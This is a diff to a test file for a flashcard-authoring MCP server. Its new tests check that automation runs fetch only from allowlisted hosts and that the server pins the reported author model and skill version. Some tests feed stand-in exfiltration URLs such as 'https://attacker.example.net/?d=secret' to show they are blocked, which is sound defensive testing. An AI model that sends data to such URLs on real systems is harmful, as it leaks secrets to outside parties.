@@ -8,12 +8,14 @@ import { fileURLToPath } from 'node:url';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
 import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
 import { afterEach, describe, expect, it } from 'vitest';
-import { automationRunFrom, createServer } from '../src/server';
+import type { RunProcess } from '../src/ingest';
+import { automationAuthorFrom, automationRunFrom, automationSourceHosts, createServer } from '../src/server';
 import {
   callTool,
   envelope,
   errorEnvelope,
   fakeIngest,
+  ingestDoc,
   makeTestEnv,
   SAMPLE_SOURCES,
   sampleCard,
@@ -37,10 +39,12 @@ const DECKS_PAGE = {
 const SUBMIT_DATA = { batchId: 'b-1', created: [], duplicates: [], rejected: [] };
 
 const RUN_ID = '3F2504E0-4F89-41D3-9A0C-0305E82C3301';
+// The runner always passes the run's source hosts (ai-agent-1); the sample sources live on example.com.
 const AUTOMATION_ENV = {
   DC_AUTOMATION_RUN_ID: RUN_ID,
   DC_AUTOMATION_QUEUE_ITEM_ID: '42',
   DC_AUTOMATION_DECK_SLUG: 'aws-saa-c03',
+  DC_AUTOMATION_SOURCE_HOSTS: 'example.com',
 };
 
 const happy: FakeHandler = (req, res) => {
@@ -175,6 +179,134 @@ describe('submit_draft in an automation run', () => {
     expect(postedAgent()).toEqual({ name: 'developercards-mcp', model: 'claude-opus-5-5', skillVersion: '1.0.0' });
     expect(warnings).toEqual([]);
     await client.close();
+  });
+});
+
+describe('read_source egress inside an automation run (ai-agent-1)', () => {
+  let env: TestEnv;
+  afterEach(() => env.cleanup());
+
+  /** A RunProcess that answers every source like dc-ingest would and records each call's source and env. */
+  function recordingIngest(): { calls: Array<{ source: string; env: NodeJS.ProcessEnv }>; run: RunProcess } {
+    const calls: Array<{ source: string; env: NodeJS.ProcessEnv }> = [];
+    const run: RunProcess = async (_command, args, options) => {
+      const source = args[args.length - 1] ?? '';
+      calls.push({ source, env: options.env });
+      const doc = SAMPLE_SOURCES[source] ?? { sourceId: 'sid-any', chunks: ['Any page text that is long enough.'] };
+      return { code: 0, stdout: `${JSON.stringify(ingestDoc(source, doc))}\n`, stderr: '' };
+    };
+    return { calls, run };
+  }
+
+  async function connectWith(serverEnv: Record<string, string | undefined>, run: RunProcess): Promise<Client> {
+    env = makeTestEnv();
+    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
+    const server = createServer({ config: env.config, runProcess: run, env: serverEnv, warn: () => undefined });
+    await server.connect(serverTransport);
+    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
+    await client.connect(clientTransport);
+    return client;
+  }
+
+  it('refuses a host outside DC_AUTOMATION_SOURCE_HOSTS before any fetch and passes the list to dc-ingest', async () => {
+    const ingest = recordingIngest();
+    const client = await connectWith({ ...AUTOMATION_ENV, DC_AUTOMATION_SOURCE_HOSTS: ' Example.com ,docs.aws.amazon.com' }, ingest.run);
+
+    const denied = await callTool(client, 'read_source', { source: 'https://attacker.example.net/?d=secret' });
+    expect(denied.isError).toBe(true);
+    expect(denied.text).toBe(
+      'SOURCE_HOST_NOT_ALLOWED: attacker.example.net is not in DC_AUTOMATION_SOURCE_HOSTS; an automation run reads only example.com, docs.aws.amazon.com',
+    );
+    expect(ingest.calls).toEqual([]);
+
+    // submit_draft's implicit read of an unread citation goes through the same check.
+    const card = sampleCard();
+    const submitted = await callTool(client, 'submit_draft', {
+      deckSlug: 'aws-saa-c03',
+      drafts: [{ ...card, source: { ...card.source, url: 'https://attacker.example.net/leak' } }],
+    });
+    expect(submitted.isError).toBe(true);
+    expect(submitted.text).toMatch(/SOURCE_NOT_INGESTED/);
+    expect(ingest.calls).toEqual([]);
+
+    const allowed = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
+    expect(allowed.isError).toBe(false);
+    expect(ingest.calls.map((c) => c.source)).toEqual(['https://example.com/s3/retrieval-options']);
+    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBe('example.com,docs.aws.amazon.com');
+    await client.close();
+  });
+
+  it('falls back to the default documentation hosts when the runner passes no list', async () => {
+    const ingest = recordingIngest();
+    const client = await connectWith({ DC_AUTOMATION_RUN_ID: RUN_ID }, ingest.run);
+    const denied = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
+    expect(denied.isError).toBe(true);
+    expect(denied.text).toMatch(/^SOURCE_HOST_NOT_ALLOWED: example\.com /);
+    const allowed = await callTool(client, 'read_source', { source: 'https://docs.aws.amazon.com/lambda/latest/dg/welcome.html' });
+    expect(allowed.isError).toBe(false);
+    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBe(
+      'docs.aws.amazon.com,aws.amazon.com,platform.claude.com,docs.claude.com,docs.anthropic.com,www.anthropic.com',
+    );
+    await client.close();
+  });
+
+  it('keeps read_source unlimited outside an automation run', async () => {
+    const ingest = recordingIngest();
+    const client = await connectWith({ DC_AUTOMATION_SOURCE_HOSTS: 'docs.aws.amazon.com' }, ingest.run);
+    const read = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
+    expect(read.isError).toBe(false);
+    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBeUndefined();
+    expect(automationSourceHosts({ runId: null, queueItemId: null, deckSlug: null }, { DC_AUTOMATION_SOURCE_HOSTS: 'a.example' })).toBeUndefined();
+    await client.close();
+  });
+});
+
+describe('the pinned author configuration (ai-agent-3)', () => {
+  let env: TestEnv;
+  let api: FakeServer;
+  afterEach(async () => {
+    await api?.close();
+    env.cleanup();
+  });
+
+  it('sends the runner-pinned model and skill version instead of what the model claims', async () => {
+    api = await startFakeServer(happy);
+    env = makeTestEnv({ apiBase: api.base });
+    writeValidTokens(env.config);
+    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
+    const server = createServer({
+      config: env.config,
+      runProcess: fakeIngest(SAMPLE_SOURCES).run,
+      env: { ...AUTOMATION_ENV, DC_AUTOMATION_AUTHOR_MODEL: 'claude-opus-5-5', DC_AUTOMATION_SKILL_VERSION: 'author-cards@1.8.1' },
+      warn: () => undefined,
+    });
+    await server.connect(serverTransport);
+    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
+    await client.connect(clientTransport);
+
+    const result = await callTool(client, 'submit_draft', {
+      deckSlug: 'aws-saa-c03',
+      drafts: [sampleCard()],
+      agent: { model: 'something-else', skillVersion: 'author-cards@9.9.9' },
+    });
+    expect(result.isError).toBe(false);
+    const post = api.requests.find((req) => req.method === 'POST' && req.url === '/api/v1/authoring/drafts');
+    expect((JSON.parse(post?.body ?? '{}') as { agent: unknown }).agent).toEqual({
+      name: 'developercards-mcp',
+      model: 'claude-opus-5-5',
+      skillVersion: 'author-cards@1.8.1',
+      runId: RUN_ID.toLowerCase(),
+      queueItemId: '42',
+    });
+    await client.close();
+  });
+
+  it('reads only printable single-token values', () => {
+    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_MODEL: ' claude-opus-5-5 ', DC_AUTOMATION_SKILL_VERSION: 'bad value' })).toEqual({
+      model: 'claude-opus-5-5',
+      skillVersion: null,
+    });
+    expect(automationAuthorFrom({})).toEqual({ model: null, skillVersion: null });
   });
 });
 
